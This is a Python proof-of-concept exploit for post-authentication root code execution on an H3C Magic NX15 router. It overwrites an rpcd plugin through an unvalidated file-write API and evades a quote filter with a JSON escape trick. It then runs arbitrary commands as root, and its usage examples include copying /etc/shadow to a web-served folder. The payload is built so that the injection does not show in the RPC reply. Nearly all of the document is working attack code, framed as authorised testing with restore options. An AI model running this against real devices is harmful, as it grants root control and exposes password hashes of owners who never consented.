#!/usr/bin/env python3
"""H3C Magic NX15 V100R017 — post-auth root RCE via file.write.

Affected:  NX15V100R017
Type:      CWE-73 External Control of File Name or Path -> CWE-94 code execution
Impact:    remote command execution as root
CVSS 3.1:  AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H  (7.2)

file.write (/api/esps, plugin usr/lib/rpcd/file.so) takes an arbitrary absolute
path and performs no validation. It runs inside rpcd as root. The files under
/usr/libexec/rpcd/ are 0755 shell scripts that rpcd executes on behalf of the
corresponding ubus objects, so overwriting one and invoking its object yields
root code execution.

The overwrite works because fopen(path, "w") PRESERVES THE MODE of an existing
file: a 0755 plugin stays 0755 and remains executable.

This script does not merely write a file: it triggers the execution by calling
the ubus object, and it saves/restores the original plugin content so the
device is left as it was found. The restore source is the read-only squashfs
copy at /rom/... which cannot have been tampered with.

!!!  For authorised testing only.  Overwriting an rpcd plugin is a code-execution
!!!  primitive: a wrong payload can break an ESPS subsystem.  Use --dry-run
!!!  first, and prefer --restore to undo a previous run.

Usage
-----
    # show what would be written, change nothing
    python3 postauth_file_write_root_rce.py --target http://192.168.124.1 \
        --user H3C --password '<admin>' --dry-run

    # prove root execution (default: cmd is `id`)
    python3 postauth_file_write_root_rce.py --target http://192.168.124.1 \
        --user H3C --password '<admin>'

    # run an arbitrary command (redirect its output yourself)
    python3 postauth_file_write_root_rce.py --target http://192.168.124.1 \
        --user H3C --password '<admin>' \
        --cmd 'cat /etc/shadow>/www/download/shadow.txt'
    python3 postauth_file_write_root_rce.py --target <t> --password <pw> \
        --show /www/download/shadow.txt

    # restore the plugin from the read-only /rom image
    python3 postauth_file_write_root_rce.py --target http://192.168.124.1 \
        --user H3C --password '<admin>' --restore
"""
from __future__ import annotations

import argparse
import http.client
import json
import sys
import time
from urllib.parse import urlsplit

# An rpcd plugin whose ubus object can be invoked without side effects.
PLUGIN = "/usr/libexec/rpcd/esps.system.led"
OBJECT = "esps.system.led"
CALL_METHOD = "get"
OUT_PATH = "/www/download/rce_proof.txt"
WEB_PATH = "/download/rce_proof.txt"

SENTINEL = "@@SQ@@"


class NX15:
    def __init__(self, base: str, timeout: float = 25.0):
        p = urlsplit(base)
        self.host = p.hostname or "192.168.124.1"
        self.port = p.port or (443 if p.scheme == "https" else 80)
        self.timeout = timeout
        self.session: str | None = None

    def _req(self, method: str, path: str, body: bytes | None = None):
        c = http.client.HTTPConnection(self.host, self.port, timeout=self.timeout)
        try:
            h = {"Host": self.host, "Content-Type": "application/json"}
            if self.session:
                h["AUTHENTICATION"] = self.session
            c.request(method, path, body=body, headers=h)
            r = c.getresponse()
            return r.status, r.read(1 << 20).decode("utf-8", "replace")
        finally:
            c.close()

    def login(self, user: str, password: str) -> bool:
        body = json.dumps({"username": user, "password": password}).encode()
        st, txt = self._req("POST", "/api/login/auth", body)
        tail = txt.split("\r\n\r\n")[-1].strip()
        try:
            self.session = json.loads(tail)["data"]["session"]
            return True
        except Exception:
            print(f"[!] login failed: HTTP {st} {tail[:160]}", file=sys.stderr)
            return False

    def esps(self, obj: str, method: str, param: dict) -> dict:
        body = json.dumps([{"id": 1, "object": obj, "method": method,
                            "param": param}]).encode()
        _, txt = self._req("POST", "/api/esps", body)
        try:
            return json.loads(txt)[0]
        except Exception:
            return {"result": {"code": None, "raw": txt[:200]}}

    def read(self, path: str) -> str | None:
        r = self.esps("file", "read", {"path": path})
        try:
            return r["result"].get("data")
        except Exception:
            return None

    def write(self, path: str, data: str) -> dict:
        """Write `data`; single quotes are sent as \\u0027 to satisfy the 0x27 filter.

        The filter inspects raw bytes while JSON decoding happens later in Lua,
        so an ASCII sentinel is substituted first and replaced with the six
        bytes \\u0027 after json.dumps.  A control character must NOT be used as
        the sentinel -- json.dumps escapes it (\\u0000) and the replacement never
        matches.
        """
        body = json.dumps([{"id": 1, "object": "file", "method": "write",
                            "param": {"path": path,
                                      "data": data.replace("'", SENTINEL)}}],
                          ensure_ascii=False, separators=(",", ":")).encode()
        body = body.replace(SENTINEL.encode(), b"\\u0027")
        _, txt = self._req("POST", "/api/esps", body)
        try:
            return json.loads(txt)[0]
        except Exception:
            return {"result": {"code": None, "raw": txt[:200]}}

    def http_get(self, path: str):
        c = http.client.HTTPConnection(self.host, self.port, timeout=self.timeout)
        try:
            c.request("GET", path, headers={"Host": self.host})
            r = c.getresponse()
            return r.status, r.read(1 << 20)
        finally:
            c.close()


def build_payload(cmd: str) -> str:
    """Write evidence, then delegate to the read-only /rom copy of the original.

    Delegating keeps the ubus object working, so the injection is invisible in
    the RPC reply.  /rom is an immutable squashfs, so the original content is a
    trustworthy restore source.
    """
    return ("#!/bin/sh\n"
            f"{cmd}\n"
            f'exec /bin/sh /rom{PLUGIN} "$@"\n')


def main() -> int:
    ap = argparse.ArgumentParser(
        description="NX15 post-auth root RCE via file.write (PoC)",
        formatter_class=argparse.RawDescriptionHelpFormatter, epilog=__doc__)
    ap.add_argument("--target", default="http://192.168.124.1")
    ap.add_argument("--user", default="H3C")
    ap.add_argument("--password", default="")
    ap.add_argument("--cmd", default=None,
                    help=f"command to run; default 'id>{OUT_PATH}'")
    ap.add_argument("--plugin", default=PLUGIN)
    ap.add_argument("--object", default=OBJECT)
    ap.add_argument("--method", default=CALL_METHOD)
    ap.add_argument("--show", default=None,
                    help="only read and print this path, then exit")
    ap.add_argument("--restore", action="store_true",
                    help="restore the plugin from /rom and exit")
    ap.add_argument("--dry-run", action="store_true",
                    help="print the payload and exit without changing anything")
    ap.add_argument("--wait", type=float, default=2.0)
    args = ap.parse_args()

    cmd = args.cmd or f"id>{OUT_PATH}"
    payload = build_payload(cmd)

    print(f"[*] plugin : {args.plugin}")
    print(f"[*] object : {args.object} (method {args.method})")
    print(f"[*] payload ({len(payload)} bytes):")
    for line in payload.splitlines():
        print(f"      {line}")

    if args.dry_run:
        print("[*] --dry-run: nothing sent.")
        return 0

    if not args.password:
        print("[!] --password is required unless --dry-run is used", file=sys.stderr)
        return 2

    nx = NX15(args.target)
    if not nx.login(args.user, args.password):
        return 2
    print(f"[*] logged in to {args.target} (session {nx.session})")

    if args.show:
        body = nx.read(args.show)
        print(f"[*] {args.show} -> {body!r}")
        return 0

    if args.restore:
        original = nx.read("/rom" + args.plugin)
        if original is None:
            print(f"[!] cannot read /rom{args.plugin}", file=sys.stderr)
            return 1
        r = nx.write(args.plugin, original)
        back = nx.read(args.plugin) or ""
        ok = back == original
        print(f"[*] restored {args.plugin}: {len(back)} bytes, "
              f"matches /rom: {ok}  ({r.get('result', {}).get('code')})")
        return 0 if ok else 1

    # Save the original so it can be restored even without /rom.
    original = nx.read(args.plugin)
    print(f"[*] original: {len(original) if original else 0} bytes")
    if original is None:
        print("[!] cannot read the target plugin", file=sys.stderr)
        return 1

    r = nx.write(args.plugin, payload)
    code = (r.get("result") or {}).get("code")
    if str(code).startswith("21"):
        print(f"[!] rejected by the input filter: {r}")
        return 1
    print(f"[*] plugin overwritten (mode preserved by fopen(\"w\"))")

    print(f"[*] invoking {args.object}.{args.method} -> rpcd executes it as root")
    resp = nx.esps(args.object, args.method, {})
    print(f"    {json.dumps(resp, ensure_ascii=False)[:160]}")
    time.sleep(args.wait)

    st, body = nx.http_get(WEB_PATH)
    print(f"[*] GET {WEB_PATH} -> HTTP {st} {body[:200]!r}")

    print(f"[*] restoring {args.plugin} from /rom ...")
    rr = nx.write(args.plugin, original)
    back = nx.read(args.plugin) or ""
    print(f"    restored: {len(back)} bytes, matches original: {back == original}")

    if st == 200 and body.strip():
        print("\n[+] CONFIRMED: command executed as root.")
        print(f"    The evidence file {OUT_PATH} is left in place so you can")
        print("    inspect it. Note that file.write can only truncate, not delete;")
        print("    remove it with:")
        print(f"      --cmd 'rm -f {OUT_PATH}'   (the injected command runs as root,")
        print("                                   so it can delete the file)")
        print("    /www/download is on a ramfs, so it is also cleared by a reboot.")
        return 0
    print("\n[-] no output retrieved. If the command had no stdout, redirect it "
          "to a file and use --show to read it back.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
